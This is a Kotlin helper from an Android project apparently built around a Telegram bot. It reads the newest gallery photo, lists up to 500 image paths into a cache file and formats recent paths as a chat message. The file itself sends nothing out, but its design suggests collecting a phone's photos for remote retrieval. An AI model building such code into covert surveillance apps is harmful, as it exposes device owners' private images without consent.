package com.example.telegrambot.helpers

import android.content.Context
import android.provider.MediaStore
import java.io.File
import java.io.FileWriter

object GalleryHelper {
    fun getLatestPhoto(context: Context): File? {
        try {
            val projection = arrayOf(MediaStore.Images.Media.DATA)
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
            )
            
            cursor?.use {
                if (it.moveToFirst()) {
                    val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                    val path = it.getString(dataIndex)
                    return File(path)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return null
    }

    fun getGalleryFilesList(context: Context): File? {
        val file = File(context.cacheDir, "gallery_files.txt")
        try {
            val writer = FileWriter(file)
            val projection = arrayOf(MediaStore.Images.Media.DATA)
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 500"
            )
            
            cursor?.use {
                val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                while (it.moveToNext()) {
                    val path = it.getString(dataIndex)
                    writer.append("$path\n")
                }
            }
            writer.flush()
            writer.close()
            return file
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return null
    }
    
    fun getRecentGalleryPathsMessage(context: Context, limit: Int = 30): String {
        try {
            val projection = arrayOf(MediaStore.Images.Media.DATA)
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
            )
            
            val paths = mutableListOf<String>()
            cursor?.use {
                val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                while (it.moveToNext() && paths.size < limit) {
                    paths.add(it.getString(dataIndex))
                }
            }
            if (paths.isEmpty()) return "No photos found in gallery."
            return "📸 Recent gallery files:\n" + paths.joinToString("\n")
        } catch (e: Exception) {
            e.printStackTrace()
            return "❌ Error reading gallery."
        }
    }
}
